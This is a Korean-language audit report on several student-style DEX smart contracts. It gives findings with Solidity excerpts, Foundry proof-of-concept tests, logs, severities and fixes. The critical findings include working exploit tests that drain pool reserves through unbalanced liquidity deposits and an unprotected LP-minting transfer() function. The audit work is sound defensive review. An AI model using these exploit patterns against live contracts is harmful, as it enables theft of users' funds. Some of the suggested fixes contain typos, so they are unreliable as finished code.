### Audit - DEX

---


조금 더 수정/추가하여 프레젠테이션을 올려두었습니다.


**[+] 유동성 공급 범위 지정의 부재 - 문성훈**

**설명**

`Dex::addLiquidity::Line47`

```solidity
function addLiquidity(uint256 tokenXAmount, uint256 tokenYAmount, uint256 minimumLPTokenAmount) external returns (uint256) {
        console.log("[+] addLiquidity()");
        
        require(tokenXAmount > 0);
        require(tokenYAmount > 0);

        uint256 LPTokenAmount = 0;

        if(totalLiquidity == 0) { 
            LPTokenAmount = sqrt((tokenXAmount) * (tokenYAmount));
        } else { 
            uint tokenXReserve = tokenX.balanceOf(address(this));
            uint tokenYReserve = tokenY.balanceOf(address(this));

            uint256 priceX = tokenXAmount * totalLiquidity / tokenXReserve;                 // LiquidityX / ReserveX
            uint256 priceY = tokenYAmount * totalLiquidity / tokenYReserve;                 // LiquidityY / ReserveY

            require(priceX == priceY);

            LPTokenAmount = priceX;
        }
}
```

유동성 공급에 있어서 토큰 페어의 비율을 검증하고 있으나 이를 `priceX == priceY` 와 같은 형태로 너무 엄격한 검사를 수행하고 있다. 실제 사용성을 고려하면 참여자들의 경우 탈중앙화 거래소(DEX)를 이용하며 산출된 `priceX` 와 `priceY` 를 일치시키기 어려울 경우가 발생할 것으로 보인다.

```solidity
function test2() external {
    dex.addLiquidity(10000 ether, 10000 ether, 0);

    uint output = dex.swap(31337 ether, 0, 0);
    console.log(output);

    dex.addLiquidity(31207 ether, 10000 ether, 0); // FAIL
}
```

**파급력** 

`Informational`

해당 경우는 확실하지 않으며 이런 경우도 Audit을 진행하며 언급하고 넘어가야 하는 상황인지 궁금해서 포함해두었다.

**해결방안**

허용가능한 범위내에서 오차를 지정하면 문제를 해결할 수 있다.
  
**[+] 유동성 공급 LP 토큰 계산 - 서준원**

**설명**

`Dex::addLiquidity::Line61 - Line67`

```solidity
if(totalSupply() == 0){
        token_liquidity_L = sqrt(reserve_x * reserve_y);
        token_amount = sqrt((tokenXAmount * tokenYAmount));
} else{
        token_amount = (tokenXAmount * 10 ** 18 * totalSupply() / reserve_x) / 10 ** 18;
}
```

유동성 초기 공급 이후 유동성 토큰의 발행개수를 `토큰X` 하나에만 의존하는 문제로 인해서 악의적인 의도를 가진 참여자는 `토큰X` 만을 많은 양 공급하여  공급량 이상의 토큰을 탈취할 수 있는 문제가 발생한다.

```solidity
function test2() external {
    uint256 LPToken1 = dex.addLiquidity(10000 ether, 10000 ether, 0);

    address attacker = vm.addr(31337);
    tokenX.transfer(attacker, 10000 ether);
    tokenY.transfer(attacker, 1);
    {
        vm.startPrank(attacker);

        tokenX.approve(address(dex), 10000 ether);
        tokenY.approve(address(dex), 1);

        uint256 LPToken2 = dex.addLiquidity(10000 ether, 1, 0);

        uint256 tokenXAmount;
        uint256 tokenYAmount;

        (tokenXAmount, tokenYAmount) = dex.removeLiquidity(LPToken2, 0, 0);

        console.log("TOKEN X AMOUNT: ", tokenXAmount / 1e18);
        console.log("TOKEN Y AMOUNT: ", tokenYAmount / 1e18);

        vm.stopPrank();
    }
}

[PASS] test2() (gas: 327181)
Logs:
  TOKEN X AMOUNT:  10000
  TOKEN Y AMOUNT:  5000
```

초기 유동성 공급자는 `토큰X` 와 `토큰Y` 를 각각 10000 ether를 공급하였고, `attacker` 의 경우 `토큰X` 의 개수를 `토큰Y` 에 비해서 극단적으로 높게 산정하여 공급하였다. 결과적으로 초기 공급량 이상의 토큰을 획득할 수 있는 문제가 발생하였다.

**파급력**

`Critical`

공격자의 경우 공급한 토큰의 양 보다 많은 토큰의 양을 탈취할 수 있는 문제이므로 가장 심각한 형태로 판단하는 `Critical` 을 부여하였다. 

**해결방안**

```solidity
uint256 priceX = tokenXAmount * totalLiquidity / tokenXReserve;                 // LiquidityX / ReserveX
uint256 priceY = tokenYAmount * totalLiquidity / tokenYReserve;                 // LiquidityY / ReserveY

require(priceX == priceY);

LPTokenAmount = priceX;
```

우선적으로 각 토큰의 공급이 동일한 가치로 공급될 수 있도록 하는 비율에 대한 검사를 수행해야 하며 해당 결과를 토대로 토큰의 발행개수를 결정해야 한다.
  
**[+] 불필요한 변수 및 연산 - 서준원**

**설명**

`Dex::전역변수 선언부`

```solidity
address private owner;
address public token_x;
address public token_y;
uint public reserve_x;
uint public reserve_y;
uint public token_liquidity_L;
uint public fee_y;
uint public fee_x;
```

`Dex::addLiquidity::Line61 - Line67`

```solidity
if(totalSupply() == 0){
    token_liquidity_L = sqrt(reserve_x * reserve_y);
    token_amount = sqrt((tokenXAmount * tokenYAmount));
} else{
    token_amount = (tokenXAmount * 10 ** 18 * totalSupply() / reserve_x) / 10 ** 18;
}
```

`addLiquidity` 내부에서 `token_liquidity_L` 을 `sqrt()` 함수를 통해 연산하고 있다. 하지만 전체 영역에서 해당 변수는 사용되지 않으며 `sqrt()` 연산은 연산(computing power)가 많이 소모되어 유동성을 공급하는 자는 불필요한 가스 소모를 발생시킬 수 있다.

**파급력**

`Informational`

해당 문제의 경우 첫번째 발생한 문제점처럼 프로덕트 자체를 위협하는 서비스가 아니며 참여자들에게 사용성의 불편함을 발생시킬 수 있는 문제이고 쉽게 수정할 수 있는 문제이므로 언급하여 해결을 바라는 마음에서 `Informational` 선정했다.

**해결방안**

`token_liquidity_L` 변수의 삭제 및 이를 이용하여 연산하는 관련 로직을 삭제하면 된다.
  
**[+] 소수점 버려짐으로 인한 무의미한 SWAP - 임나라**

**설명**

`Dex::swap::Line40 & Line59`

```solidity
if(tokenXAmount == 0) {      
    // 선행 수수료
    outputAmount = (tokenXpool * (tokenYAmount * 999 / 1000)) / (tokenYpool + (tokenYAmount * 999 / 1000));
    
    // 최소값 검증
    require(outputAmount >= tokenMinimumOutputAmount, "less than Minimum");

    // output만큼 빼주고 받아온만큼 더해주기
    tokenXpool -= outputAmount;
    tokenYpool += tokenYAmount;

    // 보내기
    tokenY.transferFrom(msg.sender, address(this), tokenYAmount);
    tokenX.transfer(msg.sender, outputAmount);
} else {
    outputAmount = (tokenYpool * (tokenXAmount * 999 / 1000)) / (tokenXpool + (tokenXAmount * 999 / 1000));

    require(outputAmount >= tokenMinimumOutputAmount, "less than Minimum");

    tokenYpool -= outputAmount;
    tokenXpool += tokenXAmount;

    tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
    tokenY.transfer(msg.sender, outputAmount);
}
```

`swap` 을 수행하는 경우 반환되는 토큰의 양을 계산식에서 선취 수수료를 산정하기 위한 계산식에서 문제가 발생한다.

```solidity
function test4() external {
    uint256 LPToken1 = dex.addLiquidity(100 ether, 100 ether, 0);

    address victim = vm.addr(31337);
    tokenX.transfer(victim, 3000);
    tokenY.transfer(victim, 3000);

    console.log("\n[BEFORE]");
    emit log_named_uint("TOKEN X: ", tokenX.balanceOf(victim));
    emit log_named_uint("TOKEN Y: ", tokenY.balanceOf(victim));

    {
        vm.startPrank(victim);

        tokenX.approve(address(dex), 3000);
        tokenY.approve(address(dex), 3000);

        for(uint256 i=0; i<3000; i++) {
            dex.swap(1, 0, 0);
            dex.swap(0, 1, 0);
        }

        vm.stopPrank();
    }

    console.log("\n[AFTER]");
    emit log_named_uint("TOKEN X: ", tokenX.balanceOf(victim));
    emit log_named_uint("TOKEN Y: ", tokenY.balanceOf(victim));
}
```

```solidity
[PASS] test4() (gas: 90829217)
Logs:
  
[BEFORE]
  TOKEN X: : 3000
  TOKEN Y: : 3000
  
[AFTER]
  TOKEN X: : 0
  TOKEN Y: : 0
```

참여자가 만약 작은 양의 토큰의 개수를 `swap` 을 수행할 경우 다음과 같이 참여자는 어떠한 토큰도 획득하지 못하는 상황이 발생할 수 있다. 상단의 상황의 경우는 참여자가 `토큰X` 와 `토큰Y` 를 각각 3000개를 보유하고 있는 상황에서 `swap` 을 수행한 이후의 어떠한 토큰도 남아있지 않은 상황을 확인할 수 있다.

**파급력**

`Informational`

거래소의 정책이 수수료보다 작은 형태에서는 모두 수수료로 수취한다는 정책을 펼칠 수 있으니 이는 기획에 따라서 달라지는 요소라고 판단한다. 하지만, End-user 입장에서 프로덕트의 사용자 친화성을 고려해서 만약 산출되는 토큰의 양이 0개라고 할 경우 참여자에게 언급해주는 것이 좋지 않을까라는 판단에서 `Inforamtional` 을 고려하였다.

**해결방안**

사용자 입장에서 거래소를 사용하기 위한 WEB2 기반과 연결된 서비스 프로덕트를 고려한다고 하면 `tokenMinimumOutput` 의 기입에 대해서 한번 더 검증하는 방식의 alert를 통해서 해결할 수 있지 않을까 판단한다.
  
**[+] 유동성 공급 비율 검증 부재로 인한 유동성 토큰 획득 문제 - 임나라**

**설명**

```solidity
function addLiquidity(uint256 tokenXAmount, uint256 tokenYAmount, uint256 minimumLPTokenAmount) external returns (uint256 LPTokenAmount){
		...
    update();

    // 같은 양을 넣더라도 넣는 시점의 상황(수수료 등등)을 고려해서 reward를 해줘야 함 -> totalSupply 값을 이용해서 LPT 계산
    if (totalSupply() == 0) {
        LPTokenAmount = tokenXAmount * tokenYAmount;
    } else {
        LPTokenAmount = tokenXAmount * totalSupply() / tokenXpool;
    }
		...
}
```

초기 유동성 공급 이후 유동성을 공급하는 경우 풀에 존재하는 유동성 토큰의 개수를 통해서만 유동성 토큰의 발행을 산출하고 있다.

 

```solidity
function test5() external {
    uint256 LPToken1 = dex.addLiquidity(1 ether, 100 ether, 0);

    address victim = vm.addr(31337);
    tokenX.transfer(victim, 300000 ether);
    tokenY.transfer(victim, 300000 ether);
    tokenY.transfer(victim, 1);

    console.log("\n[BEFORE SWAP]");
    emit log_named_uint("TOKEN X: ", tokenX.balanceOf(victim));
    emit log_named_uint("TOKEN Y: ", tokenY.balanceOf(victim));

    {
        vm.startPrank(victim);

        tokenX.approve(address(dex), type(uint).max);
        tokenY.approve(address(dex), type(uint).max);

        dex.swap(0, 300000 ether, 0);

        vm.stopPrank();
    }

    console.log("\n[AFTER SWAP]");
    emit log_named_uint("TOKEN X: ", tokenX.balanceOf(victim));
    emit log_named_uint("TOKEN Y: ", tokenY.balanceOf(victim));

    uint256 LPToken;
    {
        vm.startPrank(victim);

        LPToken =  dex.addLiquidity(100000 ether, 1, 0);

        vm.stopPrank();
    }

    console.log("\n[AFTER ADD LIQUIDITY]");
    emit log_named_uint("TOKEN X: ", tokenX.balanceOf(victim));
    emit log_named_uint("TOKEN Y: ", tokenY.balanceOf(victim));

    {
        vm.startPrank(victim);

        uint256 tokenX;
        uint256 tokenY;

        (tokenX, tokenY) = dex.removeLiquidity(LPToken, 0, 0);

        vm.stopPrank();
    }

    console.log("\n[AFTER REMOVE LIQUIDITY]");
    emit log_named_uint("TOKEN X: ", tokenX.balanceOf(victim));
    emit log_named_uint("TOKEN Y: ", tokenY.balanceOf(victim));

}
```

```solidity
[PASS] test5() (gas: 372485)
Logs:
  
[BEFORE SWAP]
  TOKEN X: : 300000000000000000000000
  TOKEN Y: : 300000000000000000000001
  
[AFTER SWAP]
  TOKEN X: : 300000999666444296197464
  TOKEN Y: : 1
  
[AFTER ADD LIQUIDITY]
  TOKEN X: : 200000999666444296197464
  TOKEN Y: : 0
  
[AFTER REMOVE LIQUIDITY]
  TOKEN X: : 300000999666444296197463
  TOKEN Y: : 300099998998999336227485
```

초기 유동성으로 `토큰X` 의 경우 `1 ether` 만 공급되어 있고, `토큰Y` 의 경우 `100 ether` 가 공급되어 있다고 가정한다. 공격자 `victim` 의 경우 초기 보유한 토큰은 각각 `300000 ether` `300001 ether` 를 보유하고 있다고 한다. 

`swap` 을 이용해서 풀에 존재하는 `토큰X` 의 개수를 최소화 한다. 결과적으로 이를 이용해서 유동성 공급을 통한 `LP 토큰` 을 최대화 하려고 함에 목적을 둔다.

결과적으로 유동성을 제거하면 공격자는 초기 보유한 토큰의 개수보다 많은 양의 토큰을 탈취할 수 있다.

**파급력**

`Critical`

해당 문제의 경우 공격자가 충분한 양의 토큰을 확보할 수 있다면 토큰의 비율을 불균형하게 만들어 `유동성 토큰` 을 의도한 바를 넘어서 획득할 수 있는 문제가 발생하여 해당 프로덕트 자체의 문제를 만들 수 있음으로 보여 `Critical` 을 부여했다.

**해결방안**

초기 유동성 공급이후 유동성 토큰을 발행할 경우, 공급되는 토큰 가치의 비율을 고려하여 토큰을 공급해야 한다.
  
**[+] 유동성 초기 공급 최소 요구량에 대한 검증 부재 -  최영현** 

**문제**

`Dex::addLiquidity::Line53`

```solidity
function addLiquidity(uint256 tokenXAmount, uint256 tokenYAmount, uint256 minimumLPTokenAmount) external returns (uint LPTokenAmount){

    require(tokenXAmount > 0 && tokenYAmount > 0);
    (uint256 reserveX, ) = amount_update();
    (, uint256 reserveY) = amount_update();

    if(totalSupply() == 0){ LPTokenAmount = tokenXAmount * tokenYAmount / 10**18;}
    else{ LPTokenAmount = totalSupply() * tokenXAmount / reserveX;}

    require(minimumLPTokenAmount <= LPTokenAmount);

    X.transferFrom(msg.sender, address(this), tokenXAmount);
    amountX = reserveX + tokenXAmount;
    Y.transferFrom(msg.sender, address(this), tokenYAmount);
    amountY = reserveY + tokenYAmount;

    _mint(msg.sender, LPTokenAmount);
}
```

유동성 초기 공급에 있어서 `tokenXAmount * tokenYAmount` 가 10 ** 8 보다 작을 경우 어떠한 유동성 토큰도 발행되지 않는 문제를 가지고 있다.

```solidity
function test2() external {
    uint256 LPToken = dex.addLiquidity(10 ** 8, 10 ** 8, 0);

    emit log_named_uint("LP TOKEN: ", LPToken);
}
```

```solidity
[PASS] test2() (gas: 138497)
Logs:
LP TOKEN: : 0
```

**파급력**

`Informational`

해당 문제의 경우 발생가능성의 경우 초기 유동성 공급이 잘 이루어진다면 큰 문제가 되지 않으므로 파급력의 경우 `Informational` 을 부여했다.

**해결방안**

`safemath` 를 활용하여 `토큰 X` 와 `토큰 Y` 를 공급하였음에도 유동성 토큰 발행이 이루어지지 않지 않도록 검증해야 한다.
  
**[+] 유동성 초기 공급 최소 요구량에 대한 검증 부재로 인한 divide by 0 -  최영현**

**문제**

```solidity
function removeLiquidity(uint256 LPTokenAmount, uint256 minimumTokenXAmount, uint256 minimumTokenYAmount) external returns (uint _tx, uint _ty){
    amount_update();

    _tx = amountX * LPTokenAmount / totalSupply();  // divide by 0
    _ty = amountY * LPTokenAmount / totalSupply();  // divide by 0

    require(_tx>=minimumTokenXAmount);
    require(_ty>=minimumTokenYAmount);

    X.transfer(msg.sender, _tx);
    Y.transfer(msg.sender, _ty);
    _burn(msg.sender, LPTokenAmount);
}
```

초기 공급량이 0일 경우 발생하는 divide by 0이다. 이는 이전에 제시했던 문제와 연결되는 방향으로 간략하게 언급만 하도록 한다. 해당 문제 또한 파급력은 `Informational` 이다.
  
**[+] 소수점 버려짐으로 인한 무의미한 SWAP - 허시원**

**설명**

```solidity
if(tokenXAmount != 0){
    outputAmount = tokenY_in_LP * (tokenXAmount * 999 / 1000) / (tokenX_in_LP + (tokenXAmount * 999 / 1000));

    require(outputAmount >= tokenMinimumOutputAmount, "minimum ouput amount check failed");
    tokenY_in_LP -= outputAmount ;
    tokenX_in_LP += tokenXAmount;
    tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
    tokenY.transfer(msg.sender, outputAmount );
}
else{
    outputAmount = tokenX_in_LP * (tokenYAmount * 999 / 1000) / (tokenY_in_LP + (tokenYAmount * 999 / 1000));

    require(outputAmount >= tokenMinimumOutputAmount, "minimum ouput amount check failed");
    tokenX_in_LP -= outputAmount;
    tokenY_in_LP += tokenXAmount;
    tokenY.transferFrom(msg.sender, address(this), tokenYAmount);
    tokenX.transfer(msg.sender, outputAmount);
}
```

해당 문제의 경우 발생은 **소수점 버려짐으로 인한 무의미한 SWAP - 임나라**와 동일한 양상으로 발생하는 경우가 있다.
  
**[+] 유동성 토큰 발행권한에 대한 검증 부재 - 구민재**

**설명**

`Dex::addLiquidity::Line106`

```solidity
function transfer(address to, uint256 lpAmount) public override(ERC20, IDex) returns (bool) {
        _mint(to, lpAmount);
        return true;
}
```

`transfer()` 함수의 경우 외부에서 모두가 접근하여 `유동성 토큰` 을 발행할 수 있다. 이를 악용한다면 유동성 공급을 하지않은 사용자가 거래소에 존재하는 `토큰X` 와 `토큰Y` 가 탈취될 수 있다.

```solidity
function test2() external {
        dex.addLiquidity(1000000 ether, 1000000 ether, 0);        
        
        address attacker = vm.addr(31337);
        emit log_named_uint("tokenX Amount: ", tokenX.balanceOf(attacker));
        emit log_named_uint("tokenY Amount: ", tokenY.balanceOf(attacker));

        vm.startPrank(attacker);
        {
            dex.transfer(attacker, 1000000 ether);
            dex.removeLiquidity(1000000 ether, 0 ether, 0 ether);

            emit log_named_uint("tokenX Amount: ", tokenX.balanceOf(attacker));
            emit log_named_uint("tokenY Amount: ", tokenY.balanceOf(attacker));
        }

        vm.stopPrank();
}
```

```solidity
[PASS] test2() (gas: 283927)
Logs:
  tokenX Amount: : 0
  tokenY Amount: : 0
  tokenX Amount: : 969346569968284491171183
  tokenY Amount: : 969346569968284491171183
```

`attacker` 의 경우 유동성 공급을 통해서 정상적인 방법이 아닌 `transfer` 를 통해서 유동성 토큰을 획득하였고 획득한 `유동성 토큰` 을 통해 `removeLiquidity` 를 호출하여 `tokenX` 와 `tokenY` 를 획득할 수 있다.

**파급력**

`Critical`

해당 문제의 경우 공격에 대한 어려움없이 `transfer(공격자, LP토큰의 개수)` 호출을 통해 토큰 획득이 가능하며 거래소의 가장 중요한 금전적 가치가 있는 자산을 탈취할 수 있는 형태이므로 가장 심각한 정도의 문제를 부여하였다.

**해결방안**

`Dex` 에서 실제 사용자가 토큰을 얼마만큼 공급하였고 얼마만큼 변화하였는 지 확인을 통한 검증이 가능하며 `onlyOwner` 와 같은 접근제어자를 사용하여 해결할 수 있다.
  
**[+] 초기 발행량 관련문제 - 구민재**

**설명**

`Dex::addLiquidity::Line31`

```solidity
function addLiquidity(uint256 tokenXAmount, uint256 tokenYAmount, uint256 minimumLPToeknAmount) public returns (uint256 LPTokenAmount) {
        require(tokenXAmount > 0 && tokenYAmount > 0, "Token must be not zero.");
        require(balanceOf(msg.sender) >= LPTokenAmount, "Insufficient LP.");
        reserveX = tokenX.balanceOf(address(this));
        reserveY = tokenY.balanceOf(address(this));
        uint256 liquidity;

        uint256 _totalSupply = totalSupply();
        if (_totalSupply == 0) {
            LPTokenAmount = _sqrt((tokenXAmount + reserveX) * (tokenYAmount + reserveY) / MINIMUM_LIQUIDITY);
        } else {
            require(reserveX * tokenYAmount == reserveY * tokenXAmount, "Add Liquidity Error");
            LPTokenAmount = _min(_totalSupply * tokenXAmount / reserveX, _totalSupply * tokenYAmount / reserveY);
        }
        require(LPTokenAmount >= minimumLPToeknAmount, "Minimum LP Error");
        _mint(msg.sender, LPTokenAmount);
        reserveX += tokenXAmount;
        reserveY += tokenYAmount;
        tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
        tokenY.transferFrom(msg.sender, address(this), tokenYAmount);

        emit AddLiquidity(msg.sender, tokenXAmount, tokenYAmount);

}
```

최소발행량 `MINIMUM_LIQUIDITY` 를 `10**3` 으로 지정하고 있다. 상단의 코드에서 확인가능하며`(tokenXAmount + reserveX) * (tokenYAmount + reserveY)` 초기 유동성을 공급하는 경우 해당 연산값이 `10**3` 보다 작을 경우 `LPTokenAmount` 가 `0` 으로 공급자는 유동성 토큰을 획득할 수 없다.

**파급력** 

`Informational`

코드를 이해할 수 없는 사용자의 경우 토큰을 공급할 경우 `유동성 토큰` 의 반환이 없어 토큰이 사라진다고 생각할 수 있다. 그러므로 참여자에게 언급해줄 필요가 있다고 판단하였다. 하지만, 초기 공급이 정상적으로 이루어진 상태라면 이후부터는 발생하지 않는 문제이므로 `Informational` 이라고 판단했다.

**해결방안**

```solidity
div((tokenXAmount + reserveX) * (tokenYAmount + reserveY),MINIMUM_LIQUIDITY)
```

유사한 문제가 발생하도록 하지 않게 `safeMath` 를 활용하여 결과값이 `0` 이 되는 여부를 판단할 수 있다.
  
**[+] 수수료 산정 테스트 케이스 실패 - 구민재**

**설명**

`Dex::swap::Line89-93`

```solidity
uint256 inputReserve = inputToken.balanceOf(address(this));
uint256 outputReserve = outputToken.balanceOf(address(this));

uint256 fee = _mul(swapsize, (999));
//init swap => fee
uint256 bs = _mul(fee, outputReserve);
uint256 tr = _add(_mul(inputReserve, 1000), fee);
outputTokenAmount = (bs / tr);
require(outputTokenAmount >= tokenMinimumOutputAmount, "Not enough Minimum Output.");
```

선취 수수료 방식을 통해서 교환비율에 대한 수수료(0.1%)를 제하고 있는 것으로 보인다. 

**파급력**

`Informational`

```solidity
function test1() external {
        dex.addLiquidity(100 ether, 100 ether, 0);

        uint output = dex.swap(100 ether, 0, 0);

        uint poolAmountX = 100 ether;
        uint poolAmountY = 100 ether;

        int expectedOutput = -(int(poolAmountX * poolAmountY) / int(poolAmountX + 100 ether)) + int(poolAmountY);
        expectedOutput = expectedOutput * 999 / 1000; // 0.1% fee
        uint uExpectedOutput = uint(expectedOutput);

        emit log_named_int("expected output", expectedOutput);
        emit log_named_uint("real output", output);

        bool success = output <= (uExpectedOutput * 10001 / 10000) && output >= (uExpectedOutput * 9999 / 10000); // allow 0.01%;
        assertTrue(success, "Swap test fail 1; expected != return");
}
```

```solidity
[FAIL. Reason: Assertion failed.] test1() (gas: 247928)
Logs:
  expected output: 49950000000000000000
  real output: 49974987493746873436
  Error: Swap test fail 1; expected != return
  Error: Assertion Failed

Test result: FAILED. 0 passed; 1 failed; finished in 4.22ms
```

발생가능성은 높으나 개발자의 의도에 따라서 달라질 것으로 보인다. 주어진 테스트 코드에서는 후취 수수료 방식을 요구하는 것으로 보이므로 언급하고 넘어가는 것으로 한다.

**해결방안**

```solidity
(outputReserve - (inputReserve * outputReserve / (inputReserve + inputAmount))) * 999 / 1000
```

선취 수수료 방식이 아닌 후취수수료 방식을 적용하여 해결하는 것으로 한다.
  
**[+] 유동성 공급 비율에 대한 검증 - 권준우**

**설명**

```solidity
function addLiquidity(uint256 tokenXAmount, uint256 tokenYAmount, uint256 minimumLPTokenAmount) public returns (uint256 LPTokenAmount){
    require(tokenXAmount > 0, "Less TokenA Supply");
    require(tokenYAmount > 0, "Less TokenB Supply");
    require(tokenX.allowance(msg.sender, address(this)) >= tokenXAmount, "ERC20: insufficient allowance");
    require(tokenY.allowance(msg.sender, address(this)) >= tokenYAmount, "ERC20: insufficient allowance");
    uint256 liqX; //liquidity of x
    uint256 liqY; //liquidity of y
    amountX = tokenX.balanceOf(address(this));// token X amount udpate
    amountY = tokenY.balanceOf(address(this));// token Y amount update
    
    if(totalSupply_ ==0 ){ //if first supply 
        LPTokenAmount = _sqrt(tokenXAmount*tokenYAmount);
    }
    else{// calculate over the before
        liqX = _mul(tokenXAmount ,totalSupply_)/amountX;
        liqY = _mul(tokenYAmount ,totalSupply_)/amountY;
        LPTokenAmount = (liqX<liqY) ? liqX:liqY; 
    }
    require(LPTokenAmount >= minimumLPTokenAmount, "Less LP Token Supply");
    transfer_(msg.sender,LPTokenAmount);
    totalSupply_ += LPTokenAmount;
    amountX += tokenXAmount;
    amountY += tokenYAmount;
    tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
    tokenY.transferFrom(msg.sender, address(this), tokenYAmount);
    return LPTokenAmount;
}
```

기본적으로 유동성 공급의 경우 `동일한 비율`의 가치로 공급되어야 한다. 그렇지 않을 경우 풀의 `CPMM` 방식인 `XY=K` 방식이 유지되지 않을 수 있다. 해당 코드에서 유동성 공급에 대한 가치의 동일성을 검증하지 않으며 더 작은양의 토큰으로 공급 비율을 맞추어 발행한다.

```solidity
function test4() external {
    console.log("[+] addLiquidity()");
    dex.addLiquidity(10000 ether, 10000 ether, 0);
    
    address victim1 = vm.addr(31337);
    tokenX.transfer(victim1, 500 ether);
    tokenY.transfer(victim1, 500 ether);
    
    vm.startPrank(victim1);
    {
        tokenX.approve(address(dex), 500  ether);
        tokenY.approve(address(dex), 500  ether);

        console.log("[+] addLiquidity()");
        uint LPReturn = dex.addLiquidity(500  ether, 500  ether, 0);
        
        console.log("[+] removeLiquidity()");
        (uint tokenX, uint tokenY) = dex.removeLiquidity(LPReturn, 0, 0);
        console.log("tokenX: ", tokenX / 1e18);
        console.log("tokenY: ", tokenY / 1e18);
    }
    vm.stopPrank();

    address victim2 = vm.addr(31338);
    tokenX.transfer(victim1, 1 ether);
    tokenY.transfer(victim1, 100000 ether);
    
    vm.startPrank(victim1);
    {
        tokenX.approve(address(dex), 1 ether);
        tokenY.approve(address(dex), 10000 ether);

        console.log("[+] addLiquidity()");
        uint LPReturn = dex.addLiquidity(1 ether, 10000 ether, 0);
        
        console.log("[+] removeLiquidity()");
        (uint tokenX, uint tokenY) = dex.removeLiquidity(LPReturn, 0, 0);
        console.log("tokenX: ", tokenX / 1e18);
        console.log("tokenY: ", tokenY / 1e18);
    }
    vm.stopPrank();

}
```

```solidity
[PASS] test4() (gas: 436101)
Logs:
  [+] addLiquidity()
  [+] addLiquidity()
  [+] removeLiquidity()
  tokenX:  500
  tokenY:  500
  [+] addLiquidity()
  [+] removeLiquidity()
  tokenX:  1
  tokenY:  1

Test result: ok. 1 passed; 0 failed; finished in 10.64ms
```

다음의 경우에서 우선적으로 풀에 공급된 `토큰X` 와 `토큰Y` 는 1대1 비율로 존재하고 있다. 그러므로 첫번째 공급이후 `addLiquidity` 의 경우 1:1의 가치의 비율로 공급되어야 한다. `victim1` 의 경우 풀에 존재하는 토큰의 비율과 동일한 형태로 공급을 수행하여 `유동성 토큰` 의 제거에도 손실이 발생하지 않았다.

하지만 `victim2` 의 경우 비율차이가 나는 경우로 `토큰X` `1 ether` 와 `토큰Y` `10000 ether` 를 공급이 가능하였으며 참여자는 보다 작은 양인 `LP 토큰` 을 획득하여 이를 통해 유동성을 제거하면 손해를 볼 수 있는 상황이 된다.

**파급력**

`High`

탈중앙화거래소(DEX)의 유동성 공급 비율에 대한 이해가 없는 사용자가 사용할 경우 불균형한 토큰 쌍의 공급으로 손실을 볼 수 있다. 이는 고려해보면 End user의 사용성을 고려하지 않은 형태의 프로덕트라고 판단하였다. 스마트 컨트랙트 측에서 최소한의 검증을 수행해야 한다고 판단하여 `High` 로 판정하였다.

**해결방안**

```solidity
require(priceX * amounX == priceY * amountY);
```

`Dex` 내부에서 `토큰 쌍` 에 대한 공급비율을 고려하여 `유동성 공급` 을 수행할 수 있도록 해야한다. 위의 코드는 예시이다. 오차범위를 지정하여 유동성 공급에 대한 검증을 수행하는 것이 좋을 것으로 판단된다.
  
**[+] 유동성 공급 비율에 대한 검증 - 김남령**

`유동성 공급 비율에 대한 검증 - 권준우` 와 동일합니다.

```solidity
function mint(address _to, uint256 _amountX, uint256 _amountY) internal returns(uint256){
    uint256 lpTotalAmount = totalSupply();
    uint256 lpValue;
    if(lpTotalAmount == 0){ //초기 상태
        lpValue = Math.sqrt(_amountX * _amountY); //amount에 대한 LP token 제공
    }
    else{ 
        lpValue = Math.min(lpTotalAmount * _amountX / reserveX_, lpTotalAmount * _amountY/ reserveY_); 
    }
    _mint(_to,lpValue);
    return lpValue;
}
```
  
**[+] 유동성 제거 사용자 요구량 검증 - 김남령**

**설명**

`Dex::removeLiquidity::Line151`

```solidity
function removeLiquidity(uint256 _LPTokenAmount, uint256 _minimumTokenXAmount, uint256 _minimumTokenYAmount) external returns(uint256, uint256){
        require(_LPTokenAmount > 0, "INSUFFICIENT_AMOUNT");
        require(balanceOf(msg.sender) >= _LPTokenAmount, "INSUFFICIENT_LPtoken_AMOUNT");
        
        uint256 reserveX;
        uint256 reserveY;
        uint256 amountX;
        uint256 amountY;

        (reserveX, reserveY) = _update();

        amountX =  reserveX * _LPTokenAmount/ totalSupply();
        amountY = reserveY * _LPTokenAmount / totalSupply();
        require(amountX >_minimumTokenXAmount && amountY>_minimumTokenYAmount, "INSUFFICIENT_LIQUIDITY_BURNED");
        
        tokenX_.transfer(msg.sender, amountX);
        tokenY_.transfer(msg.sender, amountY);

        _burn(msg.sender, _LPTokenAmount);

        (reserveX_,reserveY_) = _update();
        return (amountX, amountY);
}
```

유동성 제거를 위해서 사용자가 요구하는 양의 토큰에 대한 검증에서 등호(=)가 제외되어 있다. 

**파급력**

`Informational`

사용자의 경우 원하는 요구량과 동일한 형태의 토큰이 산정되어도 받을 수 없는 형태가 발생할 수 있다. 하지만 사용자 요구량 자체가 파라미터에는 존재하지만 optional한 기능이므로 해당 문제의 파급력은 `Informational` 을 부여했다.

**해결방안**

```solidity
require(amountX >= _minimumTokenXAmount && amountY >= _minimumTokenYAmount, "INSUFFICIENT_LIQUIDITY_BURNED");
```

사용자 요구량의 검증에 있어 등호(=)를 추가하면 된다.
  
**[+] removeLiquidity 실제 토큰 공급의 부재 - 김한기**

**설명**

`Dex::removeLiquidity::Line138`

```solidity
function removeLiquidity(uint256 LPTokenAmount,uint256 minimumTokenXAmount,uint256 minimumTokenYAmount) external returns (uint rx, uint ry) {
        require(LPTokenAmount > 0);
        require(minimumTokenXAmount >= 0);
        require(minimumTokenYAmount >= 0);
        require(lpt.balanceOf(msg.sender) >= LPTokenAmount);

        (uint balanceOfX, uint balanceOfY) = pairTokenBalance();

        uint lptTotalSupply = lpt.totalSupply();

        rx = balanceOfX * LPTokenAmount / lptTotalSupply;
        ry = balanceOfY * LPTokenAmount / lptTotalSupply;

        require(rx >= minimumTokenXAmount);
        require(rx >= minimumTokenYAmount);
}
```

유동성을 제거한 경우 유동성을 공급한 토큰을 반환받아야 하지만 구현되어 있지 않다.

**파급력**

`Critical`

해당 프로젝트가 실제 배포단계의 경우라고 가정하고 생각하면 서비스 자체가 운영될 수 없는 문제라고 판단해서 `Critical` 을 부여하였다. 사용자들은 공급한 토큰에 대한 반환 기능이 없을 경우 사용하지 않을 것이다.

**해결방안**

```solidity
tokenX.transfer(msg.sender, tokenXAmount);
tokenY.transfer(msg.sender, tokenYAmount);
```

